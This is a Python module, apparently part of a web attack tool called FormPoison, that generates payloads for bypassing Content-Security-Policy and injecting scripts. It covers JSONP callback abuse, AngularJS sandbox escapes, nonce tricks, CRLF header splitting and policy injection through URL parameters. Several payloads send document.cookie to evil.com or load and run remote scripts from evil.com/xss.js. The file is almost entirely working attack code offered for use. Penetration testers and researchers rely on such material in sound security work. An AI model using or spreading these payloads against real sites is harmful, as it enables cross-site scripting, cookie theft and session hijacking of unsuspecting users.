import random
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional, Tuple, Set

class CSPBypass:
    """
    Advanced CSP Bypass module for FormPoison.
    Implements PortSwigger techniques and intelligent parameter analysis.
    """
    
    def __init__(self):
        self.bypass_techniques = [
            "jsonp_endpoints",
            "angular_csp", 
            "script_nonce",
            "strict_dynamic",
            "unsafe_eval",
            "data_uri",
            "cdn_bypass",
            "parameter_injection",
            "base_uri_hijack",
            "script_src_elem_bypass",
            "trusted_types_bypass",
            "require_trusted_types",
            "policy_injection",
            "header_splitting"
        ]
        
        self.csp_directives = {
            'script-src': [
                "'unsafe-inline'", "'unsafe-eval'", 
                "'strict-dynamic'", "*", "https:", "http:",
                "https://evil.com", "http://evil.com",
                "data:", "blob:", "filesystem:"
            ],
            'script-src-elem': [
                "'unsafe-inline'", "'unsafe-eval'", 
                "'strict-dynamic'", "*", "https:", "http:",
                "https://evil.com", "http://evil.com"
            ],
            'script-src-attr': [
                "'unsafe-inline'", "'unsafe-eval'", 
                "*", "https:", "http:"
            ],
            'default-src': [
                "'unsafe-inline'", "'unsafe-eval'", 
                "*", "https:", "http:", "'none'"
            ],
        }
        
        self.crlf_variants = [
            "\\r\\n", "%0d%0a", "%0d", "%0a", "%0d%0a%0d%0a",
            "\\u000d\\u000a", "%%0d%%0a", "%E5%98%8A%E5%98%8D",
            "\\r\\n\\r\\n", "%0A%0D", "%u000a", "%u000d"
        ]

    def jsonp_endpoint_bypass(self):
        jsonp_endpoints = [
            "/jsonp?callback=alert(1)",
            "/api?callback=alert(1)",
            "/callback?func=alert(1)",
            "/jsonp?callback=eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
            "/jsonp?callback=constructor.constructor('alert(1)')()",
            "/api/v1/jsonp?cb=alert(document.domain)",
            "/ajax?callback=import('data:text/javascript,alert(1)')",
            "/jsonp?callback=Object.defineProperty(document,'cookie',{get:()=>fetch('//evil.com/?c='+document.cookie)})",
            "/jsonp?callback=document.body.innerHTML='<img src=x onerror=alert(1)>'",
            "/api/callback?jsonp=eval(atob('YWxlcnQoMSk='))",
            "/_jsonp?callback=setTimeout('alert(1)')",
            "/api/v2/jsonp?callback=Function('alert(1)')()",
        ]
        return random.choice(jsonp_endpoints)

    def angular_csp_bypass(self):
        angular_payloads = [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "{{$eval.constructor('alert(1)')()}}",
            "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "{{toString().constructor.constructor('alert(1)')()}}",
            "{{[].pop.constructor('alert(1)')()}}",
            "{{''.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}",
            "<input ng-focus=$event.view.alert(1)>",
            "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
            "{{$eval.constructor('import(\"data:text/javascript,alert(1)\")')()}}",
            "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        ]
        return random.choice(angular_payloads)

    def script_nonce_bypass(self, payload):
        nonce_bypasses = [
            f"<script>{payload}</script>",
            f"<script type='text/javascript'>{payload}</script>",
            f"<script type='application/javascript'>{payload}</script>",
            f"<script>/*{''.join(random.choices('abcdef0123456789', k=16))}*/{payload}</script>",
            f"<script nonce=undefined>{payload}</script>",
            f"<script nonce=''>{payload}</script>",
            f"<script nonce='strict-dynamic'>{payload}</script>",
            f"<script data-text={payload}>document.currentScript.text</script>",
            f"<script integrity='sha256-...'>{payload}</script>",
            f"<script id=x>{payload}</script><script>document.getElementById('x').text</script>",
            f"<script>{payload}</script><script>/* bypass */</script>",
            f"<script type='module'>{payload}</script>",
        ]
        return random.choice(nonce_bypasses)

    def strict_dynamic_bypass(self):
        dynamic_payloads = [
            "<script>var s=document.createElement('script');s.src='//evil.com/xss.js';document.body.appendChild(s);</script>",
            "<img src=x onerror='var s=document.createElement(\"script\");s.src=\"//evil.com/xss.js\";document.body.appendChild(s)'>",
            "<script>import('https://evil.com/xss.js')</script>",
            "<script>fetch('https://evil.com/xss.js').then(r=>r.text()).then(eval)</script>",
            "<link rel='import' href='https://evil.com/xss.html'>",
            "<iframe srcdoc='<script src=\"https://evil.com/xss.js\"></script>'>",
            "<script>document.body.appendChild(Object.assign(document.createElement('script'),{src:'//evil.com/xss.js'}))</script>",
            "<svg><use href='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"eval(atob(&quot;YWxlcnQoMSk=&quot;))\"/>'></use></svg>",
        ]
        return random.choice(dynamic_payloads)

    def unsafe_eval_bypass(self, payload):
        eval_payloads = [
            f"<script>eval('{payload}')</script>",
            f"<script>setTimeout('{payload}')</script>",
            f"<script>setInterval('{payload}',1)</script>",
            f"<script>Function('{payload}')()</script>",
            f"<script>new Function('{payload}')()</script>",
            f"<script>[].constructor.constructor('{payload}')()</script>",
            f"<script>''.constructor.constructor('{payload}')()</script>",
            f"<script>Reflect.construct(Function,['{payload}'])()</script>",
        ]
        return random.choice(eval_payloads)

    def data_uri_bypass(self):
        data_uris = [
            "data:text/html,<script>alert(1)</script>",
            "data:text/javascript,alert(1)",
            "data:application/javascript,alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data:text/html,<script>fetch('https://evil.com/xss.js').then(r=>eval(r.text()))</script>",
            "data:text/html,<script>import('https://evil.com/xss.js')</script>",
            "data:text/html,<body onload=alert(1)>",
            "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>",
            "data:application/xml,<script xmlns='http://www.w3.org/1999/xhtml'>alert(1)</script>",
        ]
        return random.choice(data_uris)

    def cdn_bypass(self, payload):
        cdn_payloads = [
            f"<script src='https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js'></script><script>{payload}</script>",
            f"<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js'></script><div ng-app>{{constructor.constructor('{payload}')()}}</div>",
            f"<script src='https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js'></script><script>require('https://evil.com/xss.js')</script>",
            f"<script src='https://code.jquery.com/jquery-3.6.0.min.js'></script><script>$.getScript('//evil.com/xss.js')</script>",
        ]
        return random.choice(cdn_payloads)

    def base_uri_hijack_bypass(self):
        base_payloads = [
            "<base href='https://evil.com/'>",
            "<base href='//evil.com/'>",
            "<base href='https://evil.com/' target='_blank'>",
            "<script src='xss.js'></script>",
            "<base href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<base href='javascript:alert(1)//'>",
        ]
        return random.choice(base_payloads)

    def script_src_elem_bypass(self):
        elem_bypasses = [
            "<script src='https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js'></script>",
            "<script src='https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js'></script>",
            "<iframe srcdoc='<script src=\"https://evil.com/xss.js\"></script>'>",
            "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
            "<embed src='https://evil.com/xss.swf' type='application/x-shockwave-flash'>",
            "<svg><use href='https://evil.com/xss.svg#xss'/></svg>",
        ]
        return random.choice(elem_bypasses)

    def trusted_types_bypass(self):
        trusted_payloads = [
            "<script>trustedTypes.createPolicy('xss',{createHTML:x=>x}).createHTML('<img src=x onerror=alert(1)>')</script>",
            "<script>document.body.innerHTML=trustedTypes.createPolicy('xss',{createHTML:x=>x}).createHTML('<img src=x onerror=alert(1)>');</script>",
            "<div onmouseover='eval(trustedTypes.emptyHTML)'></div>",
            "<script>const bypass=trustedTypes.createPolicy('bypass',{createScript:x=>x});eval(bypass.createScript('alert(1)'))</script>",
            "<script>trustedTypes.createPolicy('default',{createHTML:(x,_)=>{throw _;}})</script>",
        ]
        return random.choice(trusted_payloads)

    def policy_injection_bypass(self):
        policy_payloads = [
            "<meta http-equiv='Content-Security-Policy' content='script-src *'>",
            "<meta http-equiv='Content-Security-Policy' content='script-src 'unsafe-inline''>",
            "<meta http-equiv='Content-Security-Policy-Report-Only' content='script-src 'unsafe-inline''>",
            "Content-Security-Policy: script-src 'unsafe-inline'",
            "Content-Security-Policy-Report-Only: script-src *",
        ]
        return random.choice(policy_payloads)

    def header_splitting_bypass(self, original_payload):
        crlf = random.choice(self.crlf_variants[:3])
        directives = random.choice(list(self.csp_directives.keys())[:5])
        bypass_value = random.choice(self.csp_directives[directives][:3])
        
        splitting_payloads = [
            f"{original_payload}{crlf}Content-Security-Policy: {directives} {bypass_value}",
            f"{original_payload}{crlf}Content-Security-Policy-Report-Only: {directives} {bypass_value}",
            f"{original_payload}{crlf}{crlf}HTTP/1.1 200 OK{crlf}Content-Type: text/html{crlf}Content-Security-Policy: {directives} {bypass_value}{crlf}{crlf}<script>alert(1)</script>",
        ]
        return random.choice(splitting_payloads)

    def generate_url_aware_csp_payloads(self, url, original_payload, count=8):
        """
        Generuje CSP bypass payloady z uwzglednieniem analizy URL.
        Laczy standardowe techniki z analiza parametrow.
        """
        bypassed = set()
        
        # Analizuj URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Generuj payloady specyficzne dla URL
        for param_name in params.keys():
            # Podstawowe payloady PortSwigger dla kazdego parametru
            url_payloads = [
                f"{original_payload}&{param_name}=;script-src-elem 'unsafe-inline'",
                f"{original_payload}&{param_name}=;script-src 'unsafe-inline'",
                f"{original_payload}&{param_name}=;default-src 'unsafe-inline'",
                f"{original_payload}&{param_name}=;script-src *",
                f"{original_payload}&{param_name}=;script-src-elem *",
                f"<script>alert(1)</script>&{param_name}=;script-src-elem 'unsafe-inline'",
                f"<script>alert(1)</script>&{param_name}=;script-src-attr 'unsafe-inline'",
                f"<script>alert(1)</script>&{param_name}=;default-src 'unsafe-inline'",
            ]
            bypassed.update(url_payloads)
            
            # Warianty z roznymi encodingami
            encoded_payloads = [
                f"{original_payload}&{param_name}=%3Bscript-src-elem%20%27unsafe-inline%27",
                f"{original_payload}&{param_name}=%3Bscript-src%20%27unsafe-inline%27",
                f"{original_payload}&{param_name}=%3Bdefault-src%20%27unsafe-inline%27",
                f"{original_payload}&{param_name}=%3Bscript-src%20*",
            ]
            bypassed.update(encoded_payloads)
            
            # CRLF injection variants
            for crlf in ["%0d%0a", "%0d", "%0a"]:
                bypassed.add(
                    f"{original_payload}{crlf}Content-Security-Policy: script-src 'unsafe-inline'"
                )
                bypassed.add(
                    f"{original_payload}&{param_name}=value{crlf}Content-Security-Policy: script-src 'unsafe-inline'"
                )
        
        # Dodaj standardowe techniki
        standard_techniques = [
            self.jsonp_endpoint_bypass,
            self.angular_csp_bypass,
            lambda: self.script_nonce_bypass(original_payload),
            self.strict_dynamic_bypass,
            lambda: self.unsafe_eval_bypass(original_payload),
            self.data_uri_bypass,
            lambda: self.cdn_bypass(original_payload),
            self.base_uri_hijack_bypass,
            self.script_src_elem_bypass,
            self.trusted_types_bypass,
            self.policy_injection_bypass,
            lambda: self.header_splitting_bypass(original_payload),
        ]
        
        for technique in standard_techniques:
            try:
                result = technique()
                if result and result != original_payload:
                    bypassed.add(result)
            except:
                continue
        
        # Zwroc wymagana liczbe
        return list(bypassed)[:count]

    def generate_csp_bypass_payloads(self, original_payload, count=8, url=None, analyze_params=False, known_csp=None):
        """
        Generuje zbior payloadow do bypassowania CSP.
        Backward compatible z istniejacym kodem.
        """
        # Jesli podano URL, uzyj rozszerzonej wersji
        if url and analyze_params:
            return self.generate_url_aware_csp_payloads(url, original_payload, count)
        
        bypassed = set()
        
        techniques = [
            self.jsonp_endpoint_bypass,
            self.angular_csp_bypass,
            lambda: self.script_nonce_bypass(original_payload),
            self.strict_dynamic_bypass,
            lambda: self.unsafe_eval_bypass(original_payload),
            self.data_uri_bypass,
            lambda: self.cdn_bypass(original_payload),
            self.base_uri_hijack_bypass,
            self.script_src_elem_bypass,
            self.trusted_types_bypass,
            self.policy_injection_bypass,
            lambda: self.header_splitting_bypass(original_payload),
        ]
        
        while len(bypassed) < count:
            technique = random.choice(techniques)
            try:
                result = technique()
                if result and result != original_payload:
                    bypassed.add(result)
            except Exception:
                continue
            
            if len(bypassed) >= count * 3:
                break
        
        payload_list = list(bypassed)
        random.shuffle(payload_list)
        return payload_list[:count]


# Inicjalizacja globalna (zgodna z istniejacym kodem)
csp_bypass = CSPBypass()
